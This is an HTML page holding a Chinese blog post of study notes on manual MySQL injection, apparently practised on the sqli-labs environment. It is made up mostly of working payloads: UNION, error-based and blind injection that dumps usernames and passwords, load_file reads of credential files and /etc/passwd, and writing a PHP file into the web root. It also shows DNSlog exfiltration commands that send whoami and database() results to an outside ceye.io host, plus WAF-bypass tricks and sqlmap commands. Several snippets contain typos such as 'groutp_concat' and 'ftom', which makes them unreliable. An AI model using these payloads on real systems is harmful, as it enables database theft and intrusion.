@@ -1,0 +1,1027 @@
+<!doctype html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>MySQL手工注入 - ZXQ!!!</title><link rel="apple-touch-icon" href="/images/favicons/apple-touch-icon.png" sizes="180x180">
+<link rel="icon" href="/images/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+<link rel="icon" href="/images/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+<link rel="manifest" href="/images/favicons/manifest.json">
+<link rel="icon" href="/images/favicons/favicon.ico">
+<meta name="keywords" content="" />
+<meta name="description" content="" /><meta itemprop="name" content="MySQL手工注入">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2023-04-18T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2023-04-18T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="4229">
+<meta itemprop="keywords" content="," /><meta property="og:title" content="MySQL手工注入" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/tech/sql/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-04-18T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2023-04-18T00:00:00&#43;00:00" /><meta property="og:site_name" content="ZXQ!!!" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="MySQL手工注入"/>
+<meta name="twitter:description" content=""/>
+<meta data-name="palette" content="blue"><link rel=stylesheet href="/css/bundle.min.9819e4e2411e150748363de90ec254ddcda514cc29bb1238a532433adb77735b.css" integrity="sha256-mBnk4kEeFQdINj3pDsJU3c2lFMwpuxI4pTJDOtt3c1s=" crossorigin="anonymous"><script src="/js/bundle.min.e32615bc744413570374d5b28e8c02ec03c7b28c31485b6fcc5b6174a08766d9.js" integrity="sha256-4yYVvHREE1cDdNWyjowC7APHsowxSFtvzFthdKCHZtk=" crossorigin="anonymous"></script>
+<link href="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.css" rel="stylesheet">
+<script src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.js"></script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/contrib/auto-render.min.js"> </script>
+<script type="text/javascript">
+	document.addEventListener("DOMContentLoaded", function() {
+  renderMathInElement(document.body, {
+    delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false}
+    ],
+    macros: {
+      "\\ge": "\\geqslant",
+      "\\le": "\\leqslant",
+      "\\geq": "\\geqslant",
+      "\\leq": "\\leqslant"
+	}
+  });
+}); 
+</script>
+<meta property="og:type" content="index"/>
+<meta property="og:title" content="Unzybaryl`s Sekai" />
+<meta property="og:image" content="https://eustia.me/images/profile1.jpg" />
+<meta property="og:url" content="https://eustia.me/" />
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdn.jsdelivr.net/gh/flatblowfish/cave-draw/dist/cave-draw.min.js"></script></head><body><header><nav class="navbar navbar-expand-xl fixed-top">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      
+      ティアなのです！
+      
+    </a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav me-1 mb-2 mb-lg-0"><form class="search-bar d-flex ms-1" action="/search">
+  <div class="input-group input-group-sm">
+    <button class="btn btn-search disabled position-absolute left-0" type="submit"><i class="fas fa-fw fa-search"></i></button>
+    <input class="form-control rounded-pill" id="searchQuery" name="q" type="search" aria-label="Search">
+  </div>
+</form></ul><ul class="navbar-nav me-1 mb-2 mb-lg-0 me-1 ms-auto"><li class="nav-item">
+          <a class="nav-link" href="/archives">
+            <i class="fas fa-fw fa-file-archive"></i>归档
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="/bin/">
+            <i class="fas fa-fw fa-bookmark "></i>废案
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="/posts/tech/">
+            <i class="fas fa-fw fa-star"></i>技术
+          </a>
+        </li><li class="nav-item">
+  <a class="nav-link" data-bs-toggle="offcanvas" href="#offcanvasSettings" role="button"
+    aria-controls="offcanvasSettings">
+    <i class="fas fa-fw fa-sliders-h"></i> 设置
+  </a>
+</li>
+
+<div class="offcanvas offcanvas-end surface h-100" tabindex="-1" id="offcanvasSettings"
+  aria-labelledby="offcanvasSettingsLabel">
+  <div class="offcanvas-header">
+    <h5 class="offcanvas-title" w id="offcanvasSettingsLabel"><i class="fas fa-fw fa-sliders-h"></i> 设置</h5>
+    <a role="button" data-bs-dismiss="offcanvas" aria-label="Close">
+      <span class="fas fa-2x fa-fw fa-times"></span>
+    </a>
+  </div>
+  <div class="offcanvas-body"><section class="setting">
+  <form class="row">
+    <div class="col-auto">
+      <label><i class="fas fa-fw fa-adjust"></i> 模式</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <div class="form-check form-switch">
+        <input class="form-check-input" type="checkbox" id="modeSwitcher">
+      </div>
+    </div>
+  </form>
+</section>
+<section class="setting">
+  <form class="font-size-switcher-form row">
+    <div class="col-auto">
+      <label for="fontSize" class="form-label"><i class="fas fa-fw fa-font"></i> 字体大小</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <input type="range" class="form-range" min="-2" max="2" id="fontSize">
+    </div>
+  </form>
+</section>
+
+</div>
+</div></ul>
+    </div>
+  </div>
+</nav>
+</header>
+<main role="main" class="container">
+      <div class="row content">
+<div class="col-lg-8">
+  <div class="container"><nav class="row" aria-label="breadcrumb">
+  <ol class="breadcrumb surface"><li class="breadcrumb-item"><a href="/">主页</a></li><li class="breadcrumb-item"><a href="/posts/">文章</a></li><li class="breadcrumb-item"><a href="/posts/tech/">Tech</a></li><li class="breadcrumb-item active">MySQL手工注入</li></ol>
+</nav><article class="post row surface"><div class="post-panel-wrapper">
+  <div class="post-panel d-flex flex-column">
+    <a id="sidebarToggler" class="action d-none d-lg-block" role="button">
+  <i class="fas fa-fw fa-expand-alt fa-rotate-45"></i>
+</a>
+  
+    
+
+    
+    <a class="action" data-bs-container="body" data-bs-toggle="popover" data-bs-html="true" data-bs-placement="bottom"
+  data-bs-trigger="focus" tabindex="0"
+  data-bs-content="&lt;a target=&#34;_blank&#34; rel=&#34;license&#34; href=&#34;https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh&#34;&gt;CC BY-NC-ND 4.0 &lt;i class=&#34;fab fa-fw fa-creative-commons&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-by&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nc&#34;&gt;&lt;/i&gt;&lt;i class=&#34;fab fa-fw fa-creative-commons-nd&#34;&gt;&lt;/i&gt;&lt;/a&gt;
+">
+  <i class="fas fa-fw fa-copyright"></i>
+</a>
+    <a id="btnTOC" class="fas fa-fw fa-list-alt" data-bs-toggle="offcanvas" href="#offcanvasTOC" aria-controls="offcanvasTOC" role="button">
+</a>
+  </div>
+</div>
+<h1 class="post-title my-3">MySQL手工注入
+</h1><div class="post-meta mb-3">
+  <span class="post-date me-2">
+    <i class="fas fa-fw fa-calendar-alt"></i>2023-04-18
+  </span>
+  <span class="post-reading-time me-2">
+    <i class="fas fa-fw fa-coffee"></i>9 分钟阅读
+  </span>
+<a href="/categories/%E6%89%93%E6%80%AA%E5%8D%87%E7%BA%A7/" class="post-taxonomy">#打怪升级</a></div>
+
+
+
+                
+                <div class="addthis_inline_share_toolbox"></div>
+            <div class="offcanvas offcanvas-end surface" tabindex="-1" id="offcanvasTOC" aria-labelledby="offcanvasTOCLabel">
+  <div class="offcanvas-header">
+    <h5 class="offcanvas-title" id="offcanvasTOCLabel">目录</h5>
+    <a role="button" data-bs-dismiss="offcanvas" aria-label="Close">
+      <span class="fas fa-2x fa-fw fa-times"></span>
+    </a>
+  </div>
+  <div class="offcanvas-body">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#各种注入姿势">各种注入姿势</a>
+      <ul>
+        <li><a href="#union手工注入">UNION手工注入</a></li>
+        <li><a href="#报错注入">报错注入</a></li>
+        <li><a href="#布尔盲注">布尔盲注</a></li>
+        <li><a href="#时间盲注">时间盲注</a></li>
+        <li><a href="#dnslog盲注">Dnslog盲注</a></li>
+      </ul>
+    </li>
+    <li><a href="#防御绕过">防御绕过</a>
+      <ul>
+        <li><a href="#宽字节注入">宽字节注入</a></li>
+        <li><a href="#二次编码注入">二次编码注入</a></li>
+        <li><a href="#二次注入">二次注入</a></li>
+        <li><a href="#waf绕过原理">waf绕过原理</a></li>
+      </ul>
+    </li>
+    <li><a href="#sqlmap">SqlMap</a>
+      <ul>
+        <li><a href="#常用指令">常用指令</a></li>
+        <li><a href="#内置tamper脚本">内置Tamper脚本</a></li>
+        <li><a href="#tamper脚本编写">Tamper脚本编写</a></li>
+      </ul>
+    </li>
+    <li><a href="#提权">提权</a>
+      <ul>
+        <li><a href="#密码破解获取">密码破解获取</a></li>
+        <li><a href="#udf用户定义函数提权">Udf（用户定义函数）提权</a></li>
+        <li><a href="#mof托管对象格式提权">Mof（托管对象格式）提权</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div><div class="post-content mb-3" ><h2 id="各种注入姿势">各种注入姿势</h2>
+<h3 id="union手工注入">UNION手工注入</h3>
+<p>union的一些限制：</p>
+<ul>
+<li>union合并多个select语句结果，并列的select需要拥有相同数量的列，数据类型要相似（可以进行类型转换）</li>
+<li>union all允许重复值</li>
+<li>只有最后一个select子句允许order by，limit</li>
+<li>要有回显（废话）</li>
+</ul>
+<br>
+<p>原始sql语句：</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="ln"> 1</span><span class="c1">#查库
+</span><span class="ln"> 2</span><span class="c1"></span><span class="k">select</span> <span class="n">schema_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="c1">#查表
+</span><span class="ln"> 5</span><span class="c1"></span><span class="k">select</span> <span class="n">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="err">库名</span>
+<span class="ln"> 6</span><span class="k">select</span> <span class="n">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span>
+<span class="ln"> 7</span>
+<span class="ln"> 8</span><span class="c1">#查列
+</span><span class="ln"> 9</span><span class="c1"></span><span class="k">select</span> <span class="n">column_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="n">table_name</span><span class="o">=</span><span class="err">表名</span>
+<span class="ln">10</span>
+<span class="ln">11</span><span class="c1">#查数据
+</span><span class="ln">12</span><span class="c1"></span><span class="k">select</span> <span class="err">列名</span> <span class="k">from</span> <span class="err">库名</span><span class="p">.</span><span class="err">表名</span>
+<span class="ln">13</span>
+<span class="ln">14</span><span class="c1">#这些名字可以使用16进制编码来绕过单引号
+</span><span class="ln">15</span><span class="c1">#加limit0,1查询第一条
+</span><span class="ln">16</span><span class="c1"></span>
+<span class="ln">17</span><span class="c1">#concat链接多个数据为一条结果
+</span><span class="ln">18</span><span class="c1"></span><span class="k">select</span> <span class="nf">groutp_concat</span><span class="p">(</span><span class="n">schema_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span>
+</code></pre></div><p>实际注入：</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="ln"> 1</span><span class="c1">#判断几列，看什么时候报错
+</span><span class="ln"> 2</span><span class="c1"></span><span class="mi">1</span><span class="s1">&#39; order by 3 --+
+</span><span class="ln"> 3</span><span class="s1">
+</span><span class="ln"> 4</span><span class="s1">#union联合查询回显位，前面的那一段不能返回结果，置为空或者库中不存在的值
+</span><span class="ln"> 5</span><span class="s1">&#39;</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="o">--+</span>
+<span class="ln"> 6</span>
+<span class="ln"> 7</span><span class="c1">#再在回显位中输入查询的语句，先查库
+</span><span class="ln"> 8</span><span class="c1"></span><span class="mi">9999</span><span class="s1">&#39; union select 1,2,(select schema_name from information_schema.schemata limit 0,1) --+
+</span><span class="ln"> 9</span><span class="s1">
+</span><span class="ln">10</span><span class="s1">#继续查表
+</span><span class="ln">11</span><span class="s1">9999&#39;</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="k">select</span> <span class="nf">group_concat</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="p">)</span> <span class="o">--+</span>
+<span class="ln">12</span>
+<span class="ln">13</span><span class="c1">#查字段
+</span><span class="ln">14</span><span class="c1"></span><span class="mi">9999</span><span class="s1">&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;) --+
+</span><span class="ln">15</span><span class="s1">
+</span><span class="ln">16</span><span class="s1">#查数据group_concat会将两个字段拼在一起，concat_ws将两个字段通过分隔符分割开来
+</span><span class="ln">17</span><span class="s1">9999&#39;</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="k">select</span> <span class="nf">concat_ws</span><span class="p">(</span><span class="s1">&#39;~&#39;</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="k">from</span> <span class="n">security</span><span class="p">.</span><span class="n">users</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">--+</span>
+<span class="ln">18</span><span class="mi">9999</span><span class="s1">&#39; union select 1,2,(select group_concat(username,&#39;</span><span class="o">~</span><span class="s1">&#39;,password)from security.users) --+
+</span></code></pre></div><p>MySQL不能直接执行系统命令，只能通过读写文件来提权，当然需要相关权限：</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="ln">1</span><span class="c1">#读取数据库配置文件，里面有密码
+</span><span class="ln">2</span><span class="c1">#同理/etc/passwd
+</span><span class="ln">3</span><span class="c1">#有些文件可能得看网页源代码
+</span><span class="ln">4</span><span class="c1"></span><span class="s1">&#39; union select 1,2,(select load_file(&#39;</span><span class="o">/</span><span class="n">vat</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="k">sql</span><span class="o">-</span><span class="n">connection</span><span class="o">/</span><span class="n">db</span><span class="o">-</span><span class="n">creds</span><span class="p">.</span><span class="n">inc</span><span class="s1">&#39;))--+
+</span><span class="ln">5</span><span class="s1">
+</span><span class="ln">6</span><span class="s1">#写webshell
+</span><span class="ln">7</span><span class="s1">&#39;</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="k">select</span> <span class="s1">&#39;test&#39;</span> <span class="k">into</span> <span class="k">outfile</span> <span class="s1">&#39;/var/www/html/1.php&#39;</span><span class="p">))</span><span class="o">--+</span>
+</code></pre></div><h3 id="报错注入">报错注入</h3>
+<p>需要有报错回显，目的是让错误信息显示数据库中的内容。下面是让报错信息显示的一些函数：</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="ln"> 1</span><span class="c1">#floor()
+</span><span class="ln"> 2</span><span class="c1">#group by对rand()函数产生错误
+</span><span class="ln"> 3</span><span class="c1"></span><span class="k">select</span> <span class="nf">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span> <span class="k">group</span> <span class="k">by</span> <span class="nf">concat</span><span class="p">((</span><span class="k">select</span> <span class="nf">version</span><span class="p">()),</span><span class="nf">floor</span><span class="p">(</span><span class="nf">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">));</span>
+<span class="ln"> 4</span>
+<span class="ln"> 5</span><span class="c1">#extractvalue()
+</span><span class="ln"> 6</span><span class="c1">#XPATH语法错误，只会报出不符合语法格式的那部分，所以需要使用concat，且第一位需要是不符合xpath格式的值开头。
+</span><span class="ln"> 7</span><span class="c1"></span><span class="nf">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="k">user</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="n">l</span>
+<span class="ln"> 8</span>
+<span class="ln"> 9</span><span class="c1">#updatexml()
+</span><span class="ln">10</span><span class="c1">#XPATH语法错误
+</span><span class="ln">11</span><span class="c1"></span><span class="k">select</span> <span class="nf">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="k">user</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span>
+</code></pre></div><p>报错注入对返回的数据有32位的限制，可以使用函数对数据截取：</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="ln">1</span><span class="c1">#截取1到10位
+</span><span class="ln">2</span><span class="c1"></span><span class="nf">substr</span><span class="p">(</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="k">user</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="p">)</span>
+</code></pre></div><h3 id="布尔盲注">布尔盲注</h3>
+<p>页面不会回显数据，也不会回显错误信息，但返回对或错（或者类似的能够判断对错情况）。常用函数：</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="ln"> 1</span><span class="c1">#left(a,b):截取a的前b位
+</span><span class="ln"> 2</span><span class="c1"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="k">left</span><span class="p">((</span><span class="k">select</span> <span class="nf">version</span><span class="p">()),</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;s&#39;</span> <span class="o">--+</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="c1">#regexp
+</span><span class="ln"> 5</span><span class="c1"></span><span class="k">select</span> <span class="k">user</span><span class="p">()</span> <span class="k">regexp</span> <span class="s1">&#39;^r&#39;</span>
+<span class="ln"> 6</span>
+<span class="ln"> 7</span><span class="c1">#like
+</span><span class="ln"> 8</span><span class="c1"></span><span class="k">select</span> <span class="k">user</span><span class="p">()</span> <span class="k">like</span> <span class="s1">&#39;ro%&#39;</span>
+<span class="ln"> 9</span>
+<span class="ln">10</span><span class="c1">#substr(a,b,c) 将a字符串从b位置开始截取c长度
+</span><span class="ln">11</span><span class="c1">#ascii()将字符转化为ascii编码值
+</span><span class="ln">12</span><span class="c1"></span><span class="nf">ascii</span><span class="p">(</span><span class="nf">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">database</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">98</span>
+<span class="ln">13</span>
+<span class="ln">14</span><span class="c1">#mid(a,b,c) 将字符串a从b开始截取c位
+</span><span class="ln">15</span><span class="c1">#ord和ascii一样
+</span><span class="ln">16</span><span class="c1"></span><span class="nf">ord</span><span class="p">(</span><span class="nf">mid</span><span class="p">((</span><span class="k">select</span> <span class="k">user</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">114</span>
+</code></pre></div><h3 id="时间盲注">时间盲注</h3>
+<p>页面不会回显数据，也不会回显错误信息，对或错都不能判断，不能通过页面内容判断。这时我们通过响应时长来判断是否执行sql，走了哪条选择支：</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="ln">1</span><span class="c1">#if(statement,true,false)
+</span><span class="ln">2</span><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="k">user</span><span class="p">()</span><span class="n">m1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">));</span>
+<span class="ln">3</span><span class="k">if</span><span class="p">(</span><span class="nf">ascii</span><span class="p">(</span><span class="nf">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">115</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="c1">#
+</span></code></pre></div><h3 id="dnslog盲注">Dnslog盲注</h3>
+<p>为了应对布尔注入和时间注入得到结果太慢的缺点。Dnslog平台：http://ceye.io/，注册后会给你唯一标识的一个链接。</p>
+<p>DNS在解析时会留下日志，通过去读多级域名的解析日志，获取请求的信息。在linux机器上使用如下命令：</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>curl <span class="sb">`</span>whoami<span class="sb">`</span>.r4ourp.ceye.io
+</code></pre></div><p>会在Dnslog平台上留下解析记录，可以看到解析了dbo.r4ourp.ceye.io，说明whoami的结果是dbo。这样利用同样原理便可以通过Dnslog读取数据库的数据。在MySQL中发起请求：</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="ln">1</span><span class="k">select</span> <span class="nf">load_file</span><span class="p">(</span><span class="nf">concat</span><span class="p">(</span><span class="s1">&#39;\\\\&#39;</span><span class="p">,</span><span class="s1">&#39;test&#39;</span><span class="p">,</span><span class="s1">&#39;.mysql.r4ourp.ceye.io\\abc&#39;</span><span class="p">));</span>
+<span class="ln">2</span>
+<span class="ln">3</span><span class="k">select</span> <span class="nf">load_file</span><span class="p">(</span><span class="nf">concat</span><span class="p">(</span><span class="s1">&#39;\\\\&#39;</span><span class="p">,(</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="s1">&#39;.mysql.r4ourp.ceye.io\\abc&#39;</span><span class="p">));</span>
+</code></pre></div><p>注意在填入想获取信息的那个地方不能使用一些特殊符号如~@:等，同样的返回值如果有这些符号Dnslog平台上也是不会出现的，可以用hex函数绕过；load_file只能在windows使用，linux不能发起请求。</p>
+<p>老师写的Dnslog程序：https://github.com/ADOOO/DnslogSqlinj</p>
+<h2 id="防御绕过">防御绕过</h2>
+<h3 id="宽字节注入">宽字节注入</h3>
+<p>两个字节的是宽字节。一些函数对单引号转义为\&lsquo;后不能进行注入，而当MySQL使用GBK编码时，如果第一个Ascii吗大于128，会认为两个字符为一个汉字，这样为了应对\'=%5c%27，我们利用上面这个特性将%5c消灭掉：%df\'=$df%5c%27=運&rsquo;，这样就可以注入了。</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="ln">1</span><span class="n">id</span><span class="o">=%</span><span class="n">df</span><span class="s1">&#39; union select 1,(select user()),3--+
+</span></code></pre></div><p>条件：</p>
+<ul>
+<li>GBK编码等类似的宽字节编码（mysql_query(&ldquo;set names gbk&rdquo;))</li>
+<li>使用了preg_replace或addslashes或mysql_real_escape_string进行转义了</li>
+</ul>
+<p>使用sqlmap时可以在这个参数后面加上%df这样就可以检测到了。</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>sqlmap -u &#34;http://127.0.0.1/index.php?id=1%df&#34;
+</code></pre></div><p>防御：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="ln">1</span><span class="c1">//1.使用utf-8编码
+</span><span class="ln">2</span><span class="c1"></span>
+<span class="ln">3</span><span class="c1">//2.或者两个一起使用
+</span><span class="ln">4</span><span class="c1"></span><span class="nx">mysql_real_escape_string</span>
+<span class="ln">5</span><span class="nx">mysql_set_charset</span><span class="p">(</span><span class="s1">&#39;gbk&#39;</span><span class="p">,</span><span class="nv">$conn</span><span class="p">)</span>
+<span class="ln">6</span>
+<span class="ln">7</span><span class="c1">//3.设置参数：使用二进制的方式查询
+</span><span class="ln">8</span><span class="c1"></span><span class="nx">mysql_query</span><span class="p">(</span><span class="s2">&#34;character_set_client=binary&#34;</span><span class="p">,</span><span class="nv">$sql</span><span class="p">)</span>
+</code></pre></div><h3 id="二次编码注入">二次编码注入</h3>
+<p>php本身就要编码解码一次，如果这时再加入urldecode再解码一次，就会造成可以绕过单引号转义的情况。</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>id=1%2527 (php编码)-&gt; id=1%27 (转义)-&gt; id=1%27 (urldecode)-&gt; id=1&#39;
+</code></pre></div><p>具体就是urldecode放在了转义之前，这个利用条件很苛刻，因为本身是不需要自己解码的，php自己会解码。</p>
+<p>同理想要使用sqlmap，直接在u参数后面加完事。</p>
+<h3 id="二次注入">二次注入</h3>
+<p>首先需要插入恶意数据，其次还需要能够查出（要被sql用到）插入的数据。例如先插入带有单引号的数据，虽然会被转义，但是查询出来后就带单引号了。例如注册用户后修改密码，如果用户名是admin'#，这时修改的密码是管理员的密码。注意是看自己能够在什么地方控制什么参数。这种场景要么手工要么自己写利用脚本，不能用sqlmap（大概）。</p>
+<h3 id="waf绕过原理">waf绕过原理</h3>
+<p><a href="http://www.mottoin.com/86886.html">http://www.mottoin.com/86886.html</a></p>
+<p>关键词绕过：</p>
+<ol>
+<li>大小写绕过：Or，OR，oR</li>
+<li>等价替换：and-&gt;&amp;&amp;,or-&gt;||</li>
+<li>……</li>
+</ol>
+<p>架构层绕过：</p>
+<ol>
+<li>云waf -&gt; 寻找源站</li>
+<li>针对waf防护区域 -&gt; 利用同网段，边界漏洞</li>
+</ol>
+<p>资源限制角度：POST大BODY</p>
+<p>协议层面绕过：</p>
+<ol>
+<li>协议未覆盖绕waf：GET变POST；Content-Type变换。</li>
+<li>参数污染</li>
+</ol>
+<p>规则层面绕过：</p>
+<ol>
+<li>SQL注释符绕过
+<ul>
+<li>union/**/select</li>
+<li>union/*aaaa%01bbs*/select</li>
+<li>union/<em>aaaaaaaaaaaaaaaaaaa</em>/select</li>
+<li>/*!xxx*/</li>
+</ul>
+</li>
+<li>空白符绕过
+<ul>
+<li>MySQL空白符：%019,%0A,%0B,%0D,%20,%0C,%A0,/*xxx*/</li>
+<li>正则空白符：%09,%0A,%0B,%0D,%20</li>
+<li>Example:union%250Cselect,union%25A0select</li>
+</ul>
+</li>
+<li>函数分隔符号
+<ul>
+<li>concat%2520(</li>
+<li>concat/**/(</li>
+<li>concat%250c(</li>
+<li>concat%25a0(</li>
+</ul>
+</li>
+<li>浮点数词法解析
+<ul>
+<li>select * from users where id=8E0union select 1,2,3,4,5</li>
+<li>select * from users where id=8.0union select 1,2,3,4,5</li>
+<li>select * from users where id=\Nunion select 1,2,3,4,5</li>
+</ul>
+</li>
+<li>报错注入
+<ul>
+<li>extractvalue(1,concat(0x5c,md5(3)));</li>
+<li>updatexml(1,concat(0x5d,md5(3)),1);</li>
+<li>GeometryCollection((select*from(select*ftom(select@@version)f)x))</li>
+<li>polygon((select*from(select name_const(version(),1))x))</li>
+<li>linestring()</li>
+<li>multipoint()</li>
+<li>multilinestring()</li>
+<li>multipolygon()</li>
+</ul>
+</li>
+<li>MySQL特殊语法
+<ul>
+<li>select{x table_name}from{x information_schema.tables};</li>
+</ul>
+</li>
+</ol>
+<p>Fuzz绕过WAF：注释绕过为例</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="ln">1</span><span class="c1">#基本
+</span><span class="ln">2</span><span class="c1"></span><span class="k">union</span><span class="cm">/**/</span><span class="k">select</span>
+<span class="ln">3</span><span class="c1">#特殊字符（添加各种特殊字符爆破）
+</span><span class="ln">4</span><span class="c1"></span><span class="k">union</span><span class="cm">/*aaaa%01bbs*/</span><span class="k">select</span>
+<span class="ln">5</span><span class="c1">#长度测试
+</span><span class="ln">6</span><span class="c1"></span><span class="k">union</span><span class="cm">/*aaaaaaaaaaaaaaa*/</span><span class="k">select</span>
+</code></pre></div><h2 id="sqlmap">SqlMap</h2>
+<h3 id="常用指令">常用指令</h3>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln"> 1</span>Python sqlmap.py -u <span class="s2">&#34;http://127.0.0.1/Less-1/?id=1&#34;</span>
